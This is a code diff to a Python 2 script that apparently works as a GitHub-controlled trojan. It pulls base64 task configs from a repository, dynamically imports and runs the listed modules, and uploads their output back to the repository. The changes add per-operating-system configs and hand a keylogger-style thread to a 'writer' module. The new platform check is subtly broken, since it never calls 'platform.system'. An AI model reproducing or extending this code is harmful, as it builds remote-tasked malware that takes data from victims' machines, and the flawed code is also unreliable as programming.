@@ -3,6 +3,7 @@ import base64
 import sys
 import time
 import imp
+import platform
 import random
 import threading
 import Queue
@@ -19,10 +20,12 @@ except:
 process_id = ""
 
 process_config = "base.json"
+key_thread = None
 data_path = "data/%s/" % process_id
 process_modules = []
 configured = False
 task_queue = Queue.Queue()
+current_window = None
 
 
 def connect_to_github():
@@ -51,16 +54,31 @@ def get_process_config():
     global configured
     config_json = get_file_contents(process_config)
     config = json.loads(base64.b64decode(config_json))
-    configured = True
 
     for task in config:
         if task['module'] not in sys.modules:
             exec("import %s" % task['module'])
 
+    if platform.system in ["Windows", "Darwin", "Linux"]:
+        config_json = get_file_contents("%s.json" % platform.system.lower())
+        aux_config = json.loads(base64.b64decode(config_json))
+
+        for task in aux_config:
+            if task['module'] not in sys.modules:
+                exec("import %s" % task['module'])
+
+        config.update(aux_config)
+    else:
+        print "[*] Unknown platform %s" % platform.system
+
+    configured = True
     return config
 
 
 def store_module_result(data, module):
+    if not data:
+        return
+
     bb, repo, branch = connect_to_github()
     remote_path = "data/%s/%s/%d.data" % (process_id, module, int(time.time()))
     repo.create_file(remote_path, "Commit message", base64.b64encode(data))
@@ -70,7 +88,10 @@ def store_module_result(data, module):
 
 def module_runner(module):
     task_queue.put(1)
-    result = sys.modules[module].run()
+    if module == 'writer':
+        result = sys.modules[module].run(thread=key_thread)
+    else:
+        result = sys.modules[module].run()
     task_queue.get()
     print "[*] Executing module_runer for '%s'" % module
     store_module_result(result, module)
